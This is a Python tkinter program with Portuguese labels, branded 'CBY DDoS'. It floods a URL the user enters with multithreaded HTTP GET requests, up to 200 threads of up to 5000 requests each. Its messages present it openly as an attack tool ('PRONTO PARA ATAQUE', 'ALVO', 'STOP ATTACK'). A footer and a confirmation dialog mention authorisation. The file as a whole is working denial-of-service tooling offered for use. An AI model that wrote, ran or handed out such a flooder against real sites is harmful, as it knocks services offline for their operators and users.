import requests
import threading
import time
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from tkinter import font as tkfont

class TesteCargaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CBY DDoS - HTTP Load Tester")
        self.root.geometry("800x700")
        self.root.configure(bg="black")
        self.root.resizable(False, False)

        self.running = False
        self.threads = []
        self.total_reqs = 0
        self.req_concluida = 0
        self.sucessos_total = 0
        self.falhas_total = 0
        self.lock = threading.Lock()

        # Fontes
        self.title_font = tkfont.Font(family="Courier New", size=36, weight="bold")
        self.matrix_font = tkfont.Font(family="Courier New", size=11, weight="bold")
        self.small_font = tkfont.Font(family="Courier New", size=9)

        # Título FIXO (sem glitch)
        tk.Label(root, text="CBY DDoS", font=self.title_font,
                 fg="#ff0000", bg="black").pack(pady=20)

        # Boot animation (digitação suave, sem piscar)
        self.boot_frame = tk.Frame(root, bg="black")
        self.boot_frame.pack(pady=10)
        self.boot_text = tk.Label(self.boot_frame, text="", font=self.matrix_font,
                                  fg="#00ff00", bg="black", justify="center")
        self.boot_text.pack()
        self.typewriter_effect([
            "Inicializando sistema CBY DDoS...",
            "Carregando módulos de ataque HTTP...",
            "Verificando conexão com rede...",
            "Módulos carregados com sucesso.",
            "CBY DDoS v1.0 - PRONTO PARA ATAQUE"
        ], 0)

        # Config frame
        config_frame = tk.Frame(root, bg="black")
        config_frame.pack(pady=20)

        # URL
        tk.Label(config_frame, text="URL do Site:", fg="#ff0000", bg="black",
                 font=self.matrix_font).grid(row=0, column=0, sticky="e", padx=20, pady=12)
        self.entry_url = tk.Entry(config_frame, width=55, font=self.matrix_font,
                                  bg="#0d0d0d", fg="#00ff00", insertbackground="#00ff00",
                                  relief="solid", bd=1, highlightthickness=1, highlightcolor="#ff0000")
        self.entry_url.grid(row=0, column=1, padx=20, pady=12)
        self.entry_url.insert(0, "http://httpbin.org/get")

        # Threads
        tk.Label(config_frame, text="Threads:", fg="#ff0000", bg="black",
                 font=self.matrix_font).grid(row=1, column=0, sticky="e", padx=20, pady=12)
        self.spin_threads = tk.Spinbox(config_frame, from_=1, to=200, width=10,
                                       font=self.matrix_font, bg="#0d0d0d", fg="#00ff00",
                                       buttonbackground="#ff0000", relief="solid", bd=1)
        self.spin_threads.grid(row=1, column=1, sticky="w", padx=20, pady=12)
        self.spin_threads.delete(0, "end")
        self.spin_threads.insert(0, "50")

        # Reqs por thread
        tk.Label(config_frame, text="Requisições/Thread:", fg="#ff0000", bg="black",
                 font=self.matrix_font).grid(row=2, column=0, sticky="e", padx=20, pady=12)
        self.spin_reqs = tk.Spinbox(config_frame, from_=10, to=5000, increment=50, width=10,
                                    font=self.matrix_font, bg="#0d0d0d", fg="#00ff00",
                                    buttonbackground="#ff0000", relief="solid", bd=1)
        self.spin_reqs.grid(row=2, column=1, sticky="w", padx=20, pady=12)
        self.spin_reqs.delete(0, "end")
        self.spin_reqs.insert(0, "500")

        # Botão principal FIXO (sem pulsar)
        self.btn_launch = tk.Button(root, text="LAUNCH", font=("Courier New", 24, "bold"),
                                    bg="#ff0000", fg="white", width=18, height=2,
                                    relief="flat", bd=0, cursor="hand2", activebackground="#ff4444",
                                    command=self.toggle_attack)
        self.btn_launch.pack(pady=25)

        # Status + Progresso
        status_frame = tk.Frame(root, bg="black")
        status_frame.pack(pady=10)

        self.progress = ttk.Progressbar(status_frame, orient="horizontal", length=700, mode="determinate")
        self.progress.pack(pady=5)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TProgressbar", thickness=20, background="#ff0000", troughcolor="#111111")

        self.progress_label = tk.Label(status_frame, text="0 / 0 requisições | 0% concluído",
                                       fg="#00ff00", bg="black", font=self.matrix_font)
        self.progress_label.pack()

        self.status_label = tk.Label(status_frame, text="SUCESSOS: 0 | FALHAS: 0", fg="#ffff00", bg="black",
                                     font=self.matrix_font)
        self.status_label.pack(pady=5)

        # Terminal
        tk.Label(root, text="TERMINAL OUTPUT:", fg="#ff0000", bg="black",
                 font=("Courier New", 14, "bold")).pack(pady=(15,5))
        self.terminal = scrolledtext.ScrolledText(root, height=20, font=("Courier New", 10),
                                                  bg="black", fg="#00ff00", insertbackground="#00ff00",
                                                  relief="flat", bd=2, cursor="xterm")
        self.terminal.pack(padx=40, pady=10, fill="both", expand=True)
        # Cursor FIXO (sem piscar)
        self.terminal.config(insertbackground="#00ff00")

        # Rodapé
        tk.Label(root, text="CBY DDoS ~> Use apenas em ambientes autorizados", fg="#ff4444",
                 bg="black", font=self.small_font).pack(side="bottom", pady=12)

    def typewriter_effect(self, lines, index):
        if index >= len(lines):
            self.boot_frame.pack_forget()
            return
        line = lines[index]
        self.boot_text.config(text="")
        def type_char(i=0):
            if i < len(line):
                self.boot_text.config(text=self.boot_text.cget("text") + line[i])
                self.root.after(50, type_char, i+1)
            else:
                self.root.after(800, self.typewriter_effect, lines, index+1)
        type_char()

    def log(self, msg):
        self.terminal.configure(state='normal')
        self.terminal.insert(tk.END, msg + "\n")
        self.terminal.see(tk.END)
        self.terminal.configure(state='disabled')

    def update_progress(self):
        with self.lock:
            self.req_concluida += 1
            percent = (self.req_concluida / self.total_reqs) * 100 if self.total_reqs > 0 else 0
            self.progress["value"] = percent
            self.progress_label.config(text=f"{self.req_concluida} / {self.total_reqs} requisições | {percent:.1f}% concluído")
            self.root.update_idletasks()

    def add_success(self):
        with self.lock:
            self.sucessos_total += 1
            self.status_label.config(text=f"SUCESSOS: {self.sucessos_total} | FALHAS: {self.falhas_total}")

    def add_failure(self):
        with self.lock:
            self.falhas_total += 1
            self.status_label.config(text=f"SUCESSOS: {self.sucessos_total} | FALHAS: {self.falhas_total}")

    def fazer_requisicoes(self, url, num_reqs, thread_id):
        for i in range(1, num_reqs + 1):
            if not self.running:
                break
            try:
                r = requests.get(url, timeout=8)
                if r.status_code == 200:
                    self.add_success()
                    self.log(f"[THREAD-{thread_id:02d}] → {url} [200] OK ({i}/{num_reqs})")
                else:
                    self.add_failure()
                    self.log(f"[THREAD-{thread_id:02d}] → {url} [{r.status_code}] ERROR ({i}/{num_reqs})")
            except:
                self.add_failure()
                self.log(f"[THREAD-{thread_id:02d}] → CONNECTION FAILED ({i}/{num_reqs})")
            self.update_progress()
            time.sleep(0.03)

        self.log(f"\n[THREAD-{thread_id:02d}] FINALIZADA\n")

    def toggle_attack(self):
        if self.running:
            if messagebox.askyesno("PARAR ATAQUE", "Tem certeza que deseja parar o ataque?"):
                self.parar_attack()
            return

        url = self.entry_url.get().strip()
        if not url.startswith(("http://", "https://")):
            messagebox.showerror("ERRO", "URL inválida! Use http:// ou https://")
            return

        try:
            threads = int(self.spin_threads.get())
            reqs = int(self.spin_reqs.get())
            if threads <= 0 or reqs <= 0:
                raise ValueError
        except:
            messagebox.showerror("ERRO", "Threads e requisições devem ser números positivos!")
            return

        if not messagebox.askyesno("CONFIRMAÇÃO FINAL",
                                   f"ALVO: {url}\n"
                                   f"{threads} threads × {reqs} reqs/thread\n"
                                   f"TOTAL: {threads * reqs} requisições\n\n"
                                   "Você tem autorização para testar este servidor?"):
            return

        # INICIAR ATAQUE
        self.running = True
        self.btn_launch.config(text="STOP ATTACK", bg="#00ff00", fg="black")
        self.terminal.configure(state='normal')
        self.terminal.delete(1.0, tk.END)
        self.terminal.configure(state='disabled')

        self.total_reqs = threads * reqs
        self.req_concluida = 0
        self.sucessos_total = 0
        self.falhas_total = 0
        self.progress["value"] = 0
        self.progress_label.config(text="0 / 0 requisições | 0% concluído")
        self.status_label.config(text="SUCESSOS: 0 | FALHAS: 0")

        self.log("╔" + "═" * 60 + "╗")
        self.log("║               CBY DDoS - ATAQUE INICIADO               ║")
        self.log("╚" + "═" * 60 + "╝")
        self.log(f"ALVO → {url}")
        self.log(f"THREADS → {threads}")
        self.log(f"REQS/THREAD → {reqs}")
        self.log(f"TOTAL → {self.total_reqs} requisições")
        self.log("\nENVIANDO PACOTES HTTP...\n")

        inicio = time.time()
        self.threads.clear()

        for i in range(threads):
            t = threading.Thread(target=self.fazer_requisicoes, args=(url, reqs, i+1), daemon=True)
            t.start()
            self.threads.append(t)

        def monitor():
            for t in self.threads:
                t.join()
            if self.running:
                dur = time.time() - inicio
                self.log("\n╔" + "═" * 60 + "╗")
                self.log(f"║        ATAQUE FINALIZADO EM {dur:.2f} SEGUNDOS         ║")
                self.log(f"║    SUCESSOS: {self.sucessos_total} | FALHAS: {self.falhas_total}    ║")
                self.log("╚" + "═" * 60 + "╝")
                self.finalizar()

        threading.Thread(target=monitor, daemon=True).start()

    def parar_attack(self):
        self.running = False
        self.log("\n!!! ATAQUE INTERROMPIDO PELO USUÁRIO !!!\n")

    def finalizar(self):
        self.running = False
        self.btn_launch.config(text="LAUNCH", bg="#ff0000", fg="white")

if __name__ == "__main__":
    root = tk.Tk()
    app = TesteCargaApp(root)
    root.mainloop()